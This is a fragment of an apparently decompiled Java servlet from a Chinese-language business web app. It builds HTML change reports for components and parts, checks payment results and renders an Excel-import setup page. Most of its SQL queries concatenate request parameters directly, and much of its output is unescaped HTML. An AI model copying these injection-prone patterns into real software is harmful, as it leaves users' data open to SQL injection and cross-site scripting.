                final String strBGLX = record.getFieldByName("s_changetype").value.toString();
                vResult.append("<td style='font-weight:bold;background:" + Dic.hashColor.get("1404886767922_" + strBGLX) + "'>").append(Dic.hash.get("1404886767922_" + strBGLX)).append("</td>");
                vResult.append("<td>").append(record.getFieldByName("s_detail").value).append("</td>");
                final String strClFSId = "1477905243146_" + record.getFieldByName("S_CLFS").value;
                vResult.append("<td style='font-weight:bold;background:" + Dic.hashColor.get(strClFSId) + ";' align='center'>").append(Dic.hash.get(strClFSId)).append("</td>");
                vResult.append("<td>" + record.getFieldByName("I_OLDSL").value + "</td>");
                vResult.append("<td>" + record.getFieldByName("I_NEWSL").value + "</td>");
                vResult.append("<td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td></tr>");
            }
        }
        catch (Exception e) {
            System.out.println(e);
            return vResult.append("</table></body></html>").toString();
        }
        finally {
            dbf.close();
        }
        dbf.close();
        return vResult.append("</table></body></html>").toString();
    }
    
    private String makeBGD() {
        final StringBuffer vResult = new StringBuffer("<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html style='width:100%;height:100%;'><style>.reptable{width:100%;background:white;} .reptable td,.yltable th { padding: 10px; border-bottom: 1px solid #f2f2f2;border-right: 1px solid #f2f2f2; } .reptable .alternate, .reptable  tr:nth-child(odd) { background: #f5f5f5; -webkit-box-shadow: 0 1px 0 rgba(255,255,255,.8) inset; -moz-box-shadow:0 1px 0 rgba(255,255,255,.8) inset; box-shadow: 0 1px 0 rgba(255,255,255,.8) inset; } .reptable th { text-align: left; padding: 10px; background-color: #eee; height:25px;  }</style><body>");
        vResult.append(AppPub.strRepTable);
        final DBFactory dbf = new DBFactory("ggsc_tmp", 1);
        final String strPid = this.request.getParameter("pid");
        TableEx tableEx = null;
        try {
            tableEx = dbf.query("select s_comid,s_partid,itype,s_changetype,s_detail from t_change where S_PID='" + strPid + "' order by s_comid,itype");
            final int iRecordCount = tableEx.getRecordCount();
            vResult.append("<tr><th width='100'>\u6784\u4ef6\u53f7</th><th width='100'>\u53d8\u66f4\u65b9\u5f0f</th><th width='100'>\u5907\u6ce8</th><th>\u96f6\u4ef6\u53d8\u52a8</th></tr>");
            String strGJH = "";
            for (int i = 0; i < iRecordCount; ++i) {
                final Record record = tableEx.getRecord(i);
                if (record.getFieldByName("itype").value.toString().equals("0")) {
                    strGJH = record.getFieldByName("s_comid").value.toString();
                    if (i == 0) {
                        vResult.append("<tr>").append("<td>").append(strGJH).append("</td>");
                    }
                    else {
                        vResult.append("</td></tr><tr>").append("<td>").append(strGJH).append("</td>");
                    }
                    final String strBGLX = record.getFieldByName("s_changetype").value.toString();
                    vResult.append("<td style='background:" + Dic.hashColor.get("1404886767922_" + strBGLX) + "'>").append(Dic.hash.get("1404886767922_" + strBGLX)).append("</td>");
                    vResult.append("<td>").append(record.getFieldByName("s_detail").value).append("</td><td>");
                }
                else if (record.getFieldByName("s_comid").value.toString().equals(strGJH)) {
                    vResult.append("<div style='width:100px;float:left;'>").append(record.getFieldByName("s_partid").value).append("</div><div style='width:100px;text-align:center;margin-right:5px;float:left;background:");
                    final String strBGLX = record.getFieldByName("s_changetype").value.toString();
                    vResult.append(Dic.hashColor.get("1404886767922_" + strBGLX)).append(";'>").append(Dic.hash.get("1404886767922_" + strBGLX)).append("</div>").append(record.getFieldByName("s_detail").value).append("<br><hr color='#f2f2f2'>");
                }
            }
        }
        catch (Exception ex) {
            return vResult.append("</td></tr></table></body></html>").toString();
        }
        finally {
            dbf.close();
        }
        dbf.close();
        return vResult.append("</td></tr></table></body></html>").toString();
    }
    
    public void doTempFun(final String _strFunId, final String _strParam1, final String _strParam2) {
        if (_strFunId.equals("0")) {
            this.generBGD_GJ(_strParam1);
        }
        else {
            this.generBGD_LJ(_strParam1);
        }
    }
    
    private HashMap initGJCLFS(final DBFactory _dbf) throws Exception {
        final HashMap vResult = new HashMap();
        final TableEx tableEx = _dbf.query("select S_COMID from t_change where itype=0 and s_clfs='LJBG'");
        for (int iRecordCount = tableEx.getRecordCount(), i = 0; i < iRecordCount; ++i) {
            final Record record = tableEx.getRecord(i);
            vResult.put(record.getFieldByName("S_COMID").value.toString(), "");
        }
        return vResult;
    }
    
    private String generBGD_LJ(final String _strParam1) {
        final DBFactory dbf = new DBFactory();
        final DBFactory dbfTemp = new DBFactory("ggsc_tmp", 1);
        TableEx tableAdd = null;
        TableEx tableDel = null;
        try {
            final HashMap hashCLFS = this.initGJCLFS(dbfTemp);
            tableAdd = dbf.query("SELECT S_PID,S_GJH,S_PARTID,S_GG,S_CD,I_ZSL,F_DJZL,F_DJZZ FROM ggsc_tmp.t_parts A where A.S_PID='" + _strParam1 + "' and NOT EXISTS( " + "SELECT * FROM t_parts B where " + " A.S_GJH=B.S_GJH and A.S_PARTID=B.S_PARTID and" + " A.S_GG=B.S_GG and  " + " A.S_CD=B.S_CD and  " + " A.I_ZSL=B.I_ZSL and  " + " A.F_DJZL=B.F_DJZL and  " + " A.F_DJZL=B.F_DJZL and  " + " A.S_PID=B.S_PID" + " ) order by S_GJH");
            tableDel = dbf.query("SELECT S_PID,S_GJH,S_PARTID,S_GG,S_CD,I_ZSL,F_DJZL,F_DJZZ FROM t_parts A where A.S_PID='" + _strParam1 + "' and NOT EXISTS( " + "SELECT * FROM ggsc_tmp.t_parts B where " + " A.S_GJH=B.S_GJH and A.S_PARTID=B.S_PARTID and" + " A.S_GG=B.S_GG and  " + " A.S_CD=B.S_CD and  " + " A.I_ZSL=B.I_ZSL and  " + " A.F_DJZL=B.F_DJZL and  " + " A.F_DJZL=B.F_DJZL and  " + " A.S_PID=B.S_PID" + " ) order by S_GJH");
            final int iDelCount = tableDel.getRecordCount();
            final HashMap hashDel = new HashMap();
            for (int i = 0; i < iDelCount; ++i) {
                final Record record = tableDel.getRecord(i);
                final String strGjh = record.getFieldByName("S_GJH").value + "$" + record.getFieldByName("S_PARTID").value;
                hashDel.put(strGjh, record.clone());
            }
            final int iAddCount = tableAdd.getRecordCount();
            dbfTemp.sqlExe("delete from t_change where S_PID='" + _strParam1 + "' and ITYPE=1", true);
            final PreparedStatement pst = dbfTemp.sqlBatchExe("INSERT INTO t_change (S_PID,S_COMID,S_PARTID,ITYPE,S_CHANGETYPE,S_DETAIL,I_OLDSL,I_NEWSL,S_CLFS) VALUES ('" + _strParam1 + "',?,?,1,?,?,?,?,?)", true);
            for (int j = 0; j < iAddCount; ++j) {
                final Record record = tableAdd.getRecord(j);
                final String strGjh2 = record.getFieldByName("S_GJH").value.toString();
                final String strPartId = record.getFieldByName("S_PARTID").value.toString();
                final String strDelId = String.valueOf(strGjh2) + "$" + strPartId;
                final Object objHashDel = hashDel.get(strDelId);
                final int iNewCount = Integer.parseInt(record.getFieldByName("I_ZSL").value.toString());
                pst.setString(1, strGjh2);
                pst.setString(2, strPartId);
                String strSLFS = "SDLJ";
                if (hashCLFS.get(strGjh2) != null) {
                    strSLFS = "LJBG";
                }
                if (objHashDel == null) {
                    pst.setString(3, "ADDLJ");
                    pst.setString(4, "");
                    pst.setInt(5, 0);
                    pst.setInt(6, iNewCount);
                }
                else {
                    final Hashtable hashOld = (Hashtable)objHashDel;
                    final int iOldCount = Integer.parseInt(hashOld.get("I_ZSL").toString());
                    final int iSubCount = iNewCount - iOldCount;
                    if (iSubCount > 0) {
                        pst.setString(3, "NMADD");
                        pst.setString(4, "\u52a0" + iSubCount + "\u4ef6");
                    }
                    else if (iSubCount < 0) {
                        pst.setString(3, "NMSUB");
                        pst.setString(4, "\u51cf" + -iSubCount + "\u4ef6");
                    }
                    else if (!hashOld.get("S_GG").toString().equals(record.getFieldByName("S_GG").value.toString())) {
                        pst.setString(3, "JMBG");
                        pst.setString(4, "");
                    }
                    else {
                        final float fOldDz = Float.parseFloat(hashOld.get("F_DJZL").toString());
                        final float ftrNewDz = Float.parseFloat(record.getFieldByName("F_DJZL").value.toString());
                        if (ftrNewDz > fOldDz) {
                            pst.setString(3, "ZLZJ");
                            pst.setString(4, "");
                        }
                        else if (ftrNewDz < fOldDz) {
                            pst.setString(3, "ZLJS");
                            pst.setString(4, "");
                        }
                        else {
                            pst.setString(3, "QTBG");
                            pst.setString(4, "");
                        }
                    }
                    pst.setInt(5, iOldCount);
                    pst.setInt(6, iNewCount);
                    hashDel.remove(strDelId);
                }
                pst.setString(7, strSLFS);
                pst.addBatch();
            }
            for (final Map.Entry entry : (Set<Map.Entry>) hashDel.entrySet()) {
                final Object strGjh3 = entry.getKey();
                final Object val = entry.getValue();
                final String[] arrgjlj = strGjh3.toString().split("\\$");
                pst.setString(1, arrgjlj[0]);
                pst.setString(2, arrgjlj[1]);
                pst.setString(3, "DELLJ");
                pst.setString(4, "");
                final int iOldCount2 = Integer.parseInt(((Hashtable)val).get("I_ZSL").toString());
                pst.setInt(5, iOldCount2);
                pst.setInt(6, 0);
                String strSLFS = "SDLJ";
                if (hashCLFS.get(strGjh3) != null) {
                    strSLFS = "LJBG";
                }
                pst.setString(7, strSLFS);
                pst.addBatch();
            }
            pst.executeBatch();
        }
        catch (Exception e) {
            e.printStackTrace();
            return "";
        }
        finally {
            dbf.close();
            dbfTemp.close();
        }
        dbf.close();
        dbfTemp.close();
        return "";
    }
    
    private String generBGD_GJ(final String _strParam1) {
        final DBFactory dbf = new DBFactory();
        final DBFactory dbfTemp = new DBFactory("ggsc_tmp", 1);
        TableEx tableAdd = null;
        TableEx tableDel = null;
        try {
            tableAdd = dbf.query("SELECT S_PID,S_GJH,S_GG,S_CD,S_COUNT,F_DZ,F_ZZ FROM ggsc_tmp.t_com A where A.S_PID='" + _strParam1 + "' and " + "NOT EXISTS(" + " SELECT * FROM t_com B where" + " A.S_GJH=B.S_GJH and" + " A.S_GG=B.S_GG and " + " A.S_CD=B.S_CD and " + " A.S_COUNT=B.S_COUNT and " + " A.F_DZ=B.F_DZ and " + " A.F_ZZ=B.F_ZZ and " + " A.S_PID=B.S_PID)");
            tableDel = dbf.query("SELECT S_PID,S_GJH,S_GG,S_CD,S_COUNT,F_DZ,F_ZZ FROM t_com A where A.S_PID='" + _strParam1 + "' and " + "NOT EXISTS(" + " SELECT * FROM ggsc_tmp.t_com B where" + " A.S_GJH=B.S_GJH and" + " A.S_GG=B.S_GG and " + " A.S_CD=B.S_CD and " + " A.S_COUNT=B.S_COUNT and " + " A.F_DZ=B.F_DZ and " + " A.F_ZZ=B.F_ZZ and " + " A.S_PID=B.S_PID)");
            final int iDelCount = tableDel.getRecordCount();
            final HashMap hashDel = new HashMap();
            for (int i = 0; i < iDelCount; ++i) {
                final Record record = tableDel.getRecord(i);
                final String strGjh = record.getFieldByName("S_GJH").value.toString();
                hashDel.put(strGjh, record.clone());
            }
            final int iAddCount = tableAdd.getRecordCount();
            dbfTemp.sqlExe("delete from t_change where S_PID='" + _strParam1 + "' and ITYPE=0", true);
            final PreparedStatement pst = dbfTemp.sqlBatchExe("INSERT INTO t_change (S_PID,S_COMID,ITYPE,S_CHANGETYPE,S_DETAIL,I_OLDSL,I_NEWSL,S_CLFS) VALUES ('" + _strParam1 + "',?,0,?,?,?,?,?)", true);
            for (int j = 0; j < iAddCount; ++j) {
                final Record record = tableAdd.getRecord(j);
                final String strGjh2 = record.getFieldByName("S_GJH").value.toString();
                final Object objHashDel = hashDel.get(strGjh2);
                pst.setString(1, strGjh2);
                final int iNewCount = Integer.parseInt(record.getFieldByName("S_COUNT").value.toString());
                if (objHashDel == null) {
                    pst.setString(2, "ADD");
                    pst.setString(3, "");
                    pst.setInt(4, 0);
                    pst.setInt(5, iNewCount);
                    pst.setString(6, "LJBG");
                }
                else {
                    final Hashtable hashOld = (Hashtable)objHashDel;
                    final int iOldCount = Integer.parseInt(hashOld.get("S_COUNT").toString());
                    final int iSubCount = iNewCount - iOldCount;
                    if (iSubCount > 0) {
                        pst.setString(2, "NMADD");
                        pst.setString(3, "\u52a0" + iSubCount + "\u4ef6");
                        pst.setString(6, "LJBG");
                    }
                    else if (iSubCount < 0) {
                        pst.setString(2, "NMSUB");
                        pst.setString(3, "\u51cf" + -iSubCount + "\u4ef6");
                        pst.setString(6, "SDGJ");
                    }
                    else {
                        if (!hashOld.get("S_GG").toString().equals(record.getFieldByName("S_GG").value.toString())) {
                            pst.setString(2, "JMBG");
                            pst.setString(3, "");
                        }
                        else {
                            final float fOldDz = Float.parseFloat(hashOld.get("F_DZ").toString());
                            final float ftrNewDz = Float.parseFloat(record.getFieldByName("F_DZ").value.toString());
                            if (ftrNewDz > fOldDz) {
                                pst.setString(2, "ZLZJ");
                                pst.setString(3, "");
                            }
                            else if (ftrNewDz < fOldDz) {
                                pst.setString(2, "ZLJS");
                                pst.setString(3, "");
                            }
                            else {
                                pst.setString(2, "QTBG");
                                pst.setString(3, "");
                            }
                        }
                        pst.setString(6, "SDGJ");
                    }
                    pst.setInt(4, iOldCount);
                    pst.setInt(5, iNewCount);
                    hashDel.remove(strGjh2);
                }
                pst.addBatch();
            }
            for (final Map.Entry entry : (Set<Map.Entry>) hashDel.entrySet()) {
                final Object strGjh3 = entry.getKey();
                final Object val = entry.getValue();
                final int iOldCount2 = Integer.parseInt(((Hashtable)val).get("S_COUNT").toString());
                pst.setString(1, strGjh3.toString());
                pst.setString(2, "DEL");
                pst.setString(3, "");
                pst.setInt(4, iOldCount2);
                pst.setInt(5, 0);
                pst.setString(6, "SDGJ");
                pst.addBatch();
            }
            pst.executeBatch();
        }
        catch (Exception e) {
            e.printStackTrace();
            return "";
        }
        finally {
            dbf.close();
            dbfTemp.close();
        }
        dbf.close();
        dbfTemp.close();
        return "";
    }
    
    private String zfjg() {
        String vResult = "fal";
        final String strOrdId = this.request.getParameter("ord");
        final Object objPayResult = Pay_Notify.hashPayResult.get(strOrdId);
        if (objPayResult != null && objPayResult.toString().equals("1")) {
            final DBFactory dbf = new DBFactory();
            try {
                final TableEx tableEx = dbf.query("select S_PURVIEW from t_sys_member where S_MEM_ORD='" + strOrdId + "'");
                final String strCurJB = tableEx.getRecord(0).getFieldByName("S_PURVIEW").value.toString();
                this.request.getSession().setAttribute("SYS_CUR_LOGIN_VIP_MSG", (Object)strCurJB);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
            vResult = "ok";
            Pay_Notify.hashPayResult.remove(strOrdId);
        }
        return vResult;
    }
    
    private StringBuffer getZj() {
        final Object objKm = this.request.getSession().getAttribute("sys_solve_to_k");
        String strKm = this.request.getParameter("k");
        if (strKm == null) {
            strKm = "";
        }
        if (strKm.equals("") && objKm != null) {
            strKm = objKm.toString();
        }
        final StringBuffer vResult = new StringBuffer(AppPub.strTable);
        vResult.append("<tr><td><select class='ylselect' onchange=\"yltPhone.sys_FlushSelData('zj','k='+this.value);\">");
        TableEx tableEx = null;
        try {
            tableEx = new TableEx("select t_005.s_id,skjh_2,jhmc_1 FROM t_005,t_002 where skjh_2=t_002.S_ID and t_005.skjh_2<>'sys_tg'", true);
            final int iKmCount = tableEx.getRecordCount();
            String strSelected = "";
            String strKKBH = "";
            for (int i = 0; i < iKmCount; ++i) {
                final Record record = tableEx.getRecord(i);
                final String strKmCode = record.getFieldByName("skjh_2").value.toString();
                if (i == 0 && strKm.equals("")) {
                    strKm = strKmCode;
                }
                if (strKm.equals(strKmCode)) {
                    strSelected = " selected";
                    strKKBH = record.getFieldByName("s_id").value.toString();
                }
                else {
                    strSelected = "";
                }
                vResult.append("<option value='" + strKmCode + "'" + strSelected + ">" + Dic.hash.get("t_002_" + strKmCode) + "</option>");
            }
            vResult.append("</select></td></tr>");
            tableEx.close();
            tableEx = new TableEx("S_ID,xsm_4", "t_003", "ssjh_7='" + strKm + "'");
            for (int iRecordCount = tableEx.getRecordCount(), j = 0; j < iRecordCount; ++j) {
                final Record record = tableEx.getRecord(j);
                vResult.append("<tr onclick=\"yltPhone.doExeFlush('comid=007&kk=" + strKKBH + "&k=" + strKm + "&z=" + record.getFieldByName("S_ID").value + "&sys_sin=dic.t_002.k,dic.t_003.z,kk');\"><td>").append(record.getFieldByName("xsm_4").value).append("</td></tr>");
            }
            vResult.append("</table>");
        }
        catch (Exception e) {
            e.printStackTrace();
            return vResult;
        }
        finally {
            if (tableEx != null) {
                tableEx.close();
            }
        }
        if (tableEx != null) {
            tableEx.close();
        }
        return vResult;
    }
    
    private StringBuffer getBx() {
        final StringBuffer vResult = new StringBuffer(AppPub.strTable);
        final String strUser = this.request.getParameter("u");
        final String strKhx = this.request.getParameter("bxtype");
        vResult.append("<tr><th>" + Dic.hash.get("T_RGXX_" + strUser) + "\u4f5c\u4e1a\u5b8c\u6210\u60c5\u51b5</th></tr>");
        final ArrayList al = Dic.hashDicCode.get(strKhx);
        for (int iCodeCount = al.size(), i = 0; i < iCodeCount; ++i) {
            final String strKhz = al.get(i).toString();
            if (!strKhx.equals(strKhz)) {
                vResult.append("<tr onclick=\"yltPhone.doKh('" + strUser + "','" + this.request.getParameter("km") + "','" + strKhx + "','" + strKhz + "','" + Dic.hashValue.get(String.valueOf(strKhx) + "_" + strKhz) + "');\"><td>").append(Dic.hash.get(String.valueOf(strKhx) + "_" + strKhz)).append("</td></tr>");
            }
        }
        this.out.println("</table>");
        return vResult;
    }
    
    private StringBuffer generSelUser(final String _strBranchId, final String _strPageCode) {
        final StringBuffer vResult = new StringBuffer();
        TableEx tableEx = null;
        try {
            tableEx = new TableEx("sygmc,sygzw", "t_rgxx", "sbranchid like '" + _strBranchId + "%'");
            final int iRecordCount = tableEx.getRecordCount();
            vResult.append(AppPub.strTable).append("<tr ><th style='height:30px;'><input id='allcheckfiter' type='checkbox' onclick=\"yltPhone.selAllCheckBox('checkfiter',this.checked);\"></th><th>\u64cd\u4f5c\u4eba</th></tr>");
            for (int i = 0; i < iRecordCount; ++i) {
                final Record record = tableEx.getRecord(i);
                final String strUserCode = record.getFieldByName("sygzw").value.toString();
                vResult.append("<tr onclick=\"yltPhone.checkRowClick(event,'").append(strUserCode).append("')\"><td style='width:50px'><input name='checkfiter' id='").append(strUserCode).append("' type='checkbox' value='").append(strUserCode).append("'").append(strUserCode).append("></td><td>").append(record.getFieldByName("sygmc").value).append("</td></tr>");
            }
            vResult.append("</table><footer style='text-align:center;width:50%;'><button class='bttn_1' style='width:40%;margin:5px;' onclick=\"yltPhone.sys_changeOPUser('" + _strPageCode + "');\">\u786e \u5b9a</button><button class='bttn_0' style='width:40%;margin:5px;'>\u53d6 \u6d88</button></footer>");
        }
        catch (Exception e) {
            e.printStackTrace();
            return vResult;
        }
        finally {
            if (tableEx != null) {
                tableEx.close();
            }
        }
        if (tableEx != null) {
            tableEx.close();
        }
        return vResult;
    }
    
    private void excelToDbConfig(final String _strImportId) {
        this.out.println("<html> <head> <script></script> <script type=\"text/javascript\" src=\"js/ylexceltodb.js\"></script> <script type=\"text/javascript\" src=\"js/evenfunction.js\"></script> <script type=\"text/javascript\" src=\"js/check.js\"></script> </head> <style>");
        this.out.println(" .fieldstyle{margin:5px;float:left;background:#fafafa;border-radius: 5px;padding-left:5px;padding-right:5px;border:1px solid gray;font-family:\u5fae\u8f6f\u96c5\u9ed1;font-size:12px;} </style>");
        this.out.println("<link href='css/table.css' rel='stylesheet' type='text/css'/>");
        this.out.println("<body style=\"width:100%;height:100%;\" background=\"images/def_pg.gif\" onload=\"\" marginwidth=\"0\" marginheight=\"0\" topmargin=\"0\" leftmargin=\"0\"> <table id=\"tab_sys_tools\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"width=\"100%\" height=\"25px\" style=\"background-image:url(images/content/opbg.png);border-left:1px solid #e6e6e6;border-right:1px solid #e6e6e6;\"> <tbody> <tr>");
        this.out.println("<td align=\"left\" height=\"25px\" width=\"100px\">");
        this.out.println(Pub.getBttn(Pub.getBttnText("qd.png", "\u4fdd\u5b58"), "yltExcelToDb.save();", "button green"));
        this.out.println("</td>");
        this.out.println("<td align=\"left\" height=\"25px\" width=\"150px\">");
        this.out.println(Pub.getBttn("bttndic", Pub.getBttnText("bttndic_text", "set.png", "\u8bbe\u7f6e\u5b57\u5178"), "yltExcelToDb.setDicConfig();", "button pink"));
        this.out.println("</td>");
        this.out.println("<td align=\"left\" height=\"25px\" width=\"150px\">");
        this.out.println(Pub.getBttn("bttnreceve", Pub.getBttnText("rec.png", "\u6570\u636e\u63a5\u6536"), "yltExcelToDb.setHiddenParam(this);", "button orange"));
        this.out.println("</td>");
        this.out.println("<td align=\"left\" height=\"25px\" width=\"150px\">");
        this.out.println(Pub.getBttn("bttnExtend", Pub.getBttnText("query.png", "\u7ee7\u627f"), "yltExcelToDb.setExtends(this);", "button green"));
        this.out.println("</td>");
        this.out.println("<td align=\"left\" height=\"25px\" width=\"150px\">");
        this.out.println(Pub.getBttn("bttnprimkey", Pub.getBttnText("query.png", "\u552f\u4e00\u6027"), "yltExcelToDb.setPrimKey(this);", "button red"));
        this.out.println("</td>");
        this.out.println("<td align=\"left\" height=\"25px\" width=\"150px\">");
        this.out.println(Pub.getBttn("bttnfilter", Pub.getBttnText("query.png", "\u5ffd\u7565\u89c4\u5219"), "yltExcelToDb.setFilter(this);", "button green"));
        this.out.println("</td>");
        this.out.println("<td align=\"left\" height=\"25px\" width=\"150px\">");
        this.out.println(Pub.getBttn(Pub.getBttnText("qx.png", "\u6e05\u9664\u8bbe\u7f6e"), "yltExcelToDb.delConfigMsg();", "button red"));
        this.out.println("</td>");
        this.out.println("<td align=\"left\" height=\"25px\" width=\"120px\">");
        this.out.println(Pub.getBttn(Pub.getBttnText("add.png", "\u5bfc\u5165\u8868"), "miniWin1('\u9009\u62e9\u8868','','View?sys_select_type=1-2&SPAGECODE=1427776889139&RETURN=_eventsetImportTable',800,600,'','');", "button blue"));
        this.out.println("</td>");
        this.out.println("<td width=\"150px\" height=\"25px\" align=\"center\"><div class=\"exceltodbbttn\"> <span id=\"sysfile1\">\u5bfc\u5165\u6a21\u677f</span> </div></td>");
        this.out.println("<td>&nbsp;</td> </tr> <tr style=\"background:white;\"> <td colspan=\"9\" id=\"tr_seltable\">");
        TableEx tableEx = null;
        String strInitBindCol = "function initExcelToDb(){var objViewFrame=document.getElementById('iframemodle').contentWindow;yltExcelToDb.strImId='" + _strImportId + "';";
        
        try {
            tableEx = new TableEx("*", "t_sys_import_msg", "S_IMID='" + _strImportId + "'");
            final Record record = tableEx.getRecord(0);
            final String strBindFields = record.getFieldByName("S_BINDCOL").value.toString();
            final String strParams = record.getFieldByName("S_PARAM").value.toString();
            final String strPrimKeys = record.getFieldByName("S_PRIMKEY").value.toString();
            final String strFilter = record.getFieldByName("S_FILTER").value.toString();
            final String strExtends = record.getFieldByName("S_EXTENDS").value.toString();
            final String[] arrFields = strBindFields.split("~");
            final int iFieldCount = arrFields.length;
            String strWhereCondition = "";
            final Hashtable hashTemp = new Hashtable();
            for (int i = 0; i < iFieldCount; ++i) {
                final String[] arrStrFields = arrFields[i].split(":");
                final String strField = arrStrFields[1];
                final String strTable = strField.split("\\$")[0];
                if (hashTemp.get(strTable) == null) {
                    strWhereCondition = String.valueOf(strWhereCondition) + "," + strTable;
                    hashTemp.put(strTable, "");
                }
                strInitBindCol = String.valueOf(strInitBindCol) + "yltExcelToDb.objCurSelHead=objViewFrame.document.getElementById('th" + arrStrFields[0] + "');yltExcelToDb.selTableField('" + strField + "','" + arrStrFields[2] + "','" + arrStrFields[3] + "');";
            }
            final Object objStartRow = record.getFieldByName("I_STARTROW").value;
            strInitBindCol = String.valueOf(strInitBindCol) + "var objStartRow=objViewFrame.document.getElementById('r_" + objStartRow + "');" + "if(objStartRow!=null){objStartRow.style.backgroundColor='red';" + "yltExcelToDb.objStarRow=objStartRow;" + "yltExcelToDb.iStartRow=" + objStartRow + ";}";
            if (!strPrimKeys.equals("")) {
                final String[] arrStrPrimKeys = strPrimKeys.split(",");
                for (int iPrimKeyCount = arrStrPrimKeys.length, j = 0; j < iPrimKeyCount; ++j) {
                    strInitBindCol = String.valueOf(strInitBindCol) + "yltExcelToDb.objprimKey['" + arrStrPrimKeys[j] + "']='';";
                }
            }
            if (!strFilter.equals("")) {
                final String[] arrStrPrimKeys = strFilter.split(",");
                for (int iPrimKeyCount = arrStrPrimKeys.length, j = 0; j < iPrimKeyCount; ++j) {
                    strInitBindCol = String.valueOf(strInitBindCol) + "yltExcelToDb.objFilter['" + arrStrPrimKeys[j] + "']='';";
                }
            }
            if (!strExtends.equals("")) {
                final String[] arrStrPrimKeys = strExtends.split(",");
                for (int iPrimKeyCount = arrStrPrimKeys.length, j = 0; j < iPrimKeyCount; ++j) {
                    strInitBindCol = String.valueOf(strInitBindCol) + "yltExcelToDb.objExtends['" + arrStrPrimKeys[j] + "']='';";
                }
            }
            final String strDicCol = record.getFieldByName("S_DICCOL").value.toString().trim();
            if (!strDicCol.equals("")) {
                final String[] arrStrDicCol = strDicCol.split(",");
                for (int iLength = arrStrDicCol.length, k = 0; k < iLength; ++k) {
                    strInitBindCol = String.valueOf(strInitBindCol) + "yltExcelToDb.objDicCol[" + arrStrDicCol[k] + "]='';iframemodle.document.getElementById('th" + arrStrDicCol[k] + "').style.background='#d6edc5';";
                }
            }
            final Hashtable hashParam = new Hashtable();
            if (!strParams.equals("")) {
                final String[] arrStrParams = strParams.split("~");
                for (int iParamCount = arrStrParams.length, l = 0; l < iParamCount; ++l) {
                    final String[] arrParamType = arrStrParams[l].split(":");
                    hashParam.put(arrParamType[0], arrParamType[1]);
                    strInitBindCol = String.valueOf(strInitBindCol) + "yltExcelToDb.objParamRecive['" + arrParamType[0] + "']='" + arrParamType[1] + "';";
                }
            }
            if (!strWhereCondition.equals("")) {
                this.getTableFields(strWhereCondition.substring(1), hashParam);
            }
        }
        catch (Exception ex) {
            //do nothing
        }
        finally {
            if (tableEx != null) {
                tableEx.close();
            }
        }
        
        strInitBindCol = String.valueOf(strInitBindCol) + "}";
        this.out.println("</td> </tr> </tbody> </table>");
        this.out.println("<script>");
        this.out.println(strInitBindCol);
        this.out.println("</script>");
        this.out.println(" <iframe id='iframemodle' onload=\"initExcelToDb();\" src=\"modexcel/sys_upload_mod_" + _strImportId + ".html\" width=\"100%\" height=\"100%\" frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" scrolling=\"auto\"></iframe> <script>var uploadUrl='" + Dic.strCurRoot + "/uploadFile?';</script> <script type=\"text/javascript\" src=\"js/yluploader.js\"></script> <script>");
        this.out.println("yltUploader.FreeOpSucces=function(){document.getElementById('iframemodle').contentWindow.location='modexcel/sys_upload_mod_" + _strImportId + ".html?id=a'+Math.random(); }");
        this.out.println("initSingUpload_FreeOp('12','modexcel','sys_upload_mod_" + _strImportId + "','85120.0','.xlsx,.xls','Excel\u6a21\u677f\u6587\u4ef6','sysfile1','sys_upload_mod_" + _strImportId + "','12');");
        this.out.println(" </script><div id='sys_prim_key' style='display:none;position: absolute;border:#909090 1px solid;background:#fff;color:#333;z-index:100002;'></div> </body> </html>");
    }
    
    private void getTableFields(final String _strTables, final Hashtable _hashParam) {
        TableEx tablex = null;
        String strSelFields = "<div id='sys_seltablefields_menu' style='display:none;position: absolute;border:#909090 1px solid;background:#fff;color:#333;z-index:100002;'><table>";
        String strHiddenParam = "<div id='sys_seltablefields_param' style='top:0px;left:0px;display:none;position: absolute;border:#909090 1px solid;background:#fff;color:#333;z-index:100002;'><table class='table1'><tr><th class='th1'>\u6570\u636e\u5e93\u5b57\u6bb5</th><th class='th1'>\u6570\u636e\u83b7\u53d6\u65b9\u5f0f</th></tr>";
        
        try {
            tablex = new TableEx("STABLENAME,STABLECODE,SITEMCODE,SITEMNAME,SITEMTYPE", "t_sys_item,t_sys_table", "t_sys_table.STABLECODE=t_sys_item.STYPECODE and STABLECODE in('" + _strTables.replaceAll(",", "','") + "') order by STYPECODE");
            final int iRecordCount = tablex.getRecordCount();
            String strCurTable = "";
            String strColor = "";
            for (int i = 0; i < iRecordCount; ++i) {
                final Record record = tablex.getRecord(i);
                final String strTableCode = record.getFieldByName("STABLECODE").value.toString();
                final String strItemCode = record.getFieldByName("SITEMCODE").value.toString();
                final Object objTableName = record.getFieldByName("STABLENAME").value;
                final Object objItemName = record.getFieldByName("SITEMNAME").value;
                final Object objItemType = record.getFieldByName("SITEMTYPE").value;
                final String strId = String.valueOf(strTableCode) + "$" + strItemCode;
                if (!strTableCode.equals(strCurTable)) {
                    this.out.print("<div class='fieldstyle' style='font-weight:bold;background:pink;'>");
                    this.out.print(objTableName);
                    this.out.print(" :</div>");
                    strCurTable = strTableCode;
                    strColor = Pub.getColor();
                }
                this.out.print("<div id='" + strId + "' class='fieldstyle'>");
                this.out.print(objItemName);
                this.out.print("</div>");
                strSelFields = String.valueOf(strSelFields) + "<tr onclick=\"yltExcelToDb.selTableField('" + strId + "','" + objItemName + "','" + objItemType + "')\" onmouseover=\"this.style.background='#fafafa';\" onmouseout=\"this.style.background='white';\"><td style='color:#" + strColor + ";'>" + objTableName + ":" + objItemName + "</td></tr>";
                final Object objParam = _hashParam.get(strId);
                String strParamValue = "-1";
                if (objParam != null) {
                    strParamValue = objParam.toString();
                }
                strHiddenParam = String.valueOf(strHiddenParam) + "<tr onmouseover=\"this.style.background='#fafafa';\" onmouseout=\"this.style.background='white';\"><td class='td1' style='color:#" + strColor + ";'>" + objTableName + ":" + objItemName + "</td>" + "<td class='td1' style='color:#" + strColor + ";'><select onchange=\"yltExcelToDb.setHiddenParamRecive('" + strId + "',this);\">" + this.getSelectOption(strParamValue) + "</select></td>" + "</tr>";
            }
        }
        catch (Exception ex) {
            //do nothing
        }
        finally {
            if (tablex != null) {
                tablex.close();
            }
        }
        
        this.out.print(String.valueOf(strSelFields) + "</table></div>");
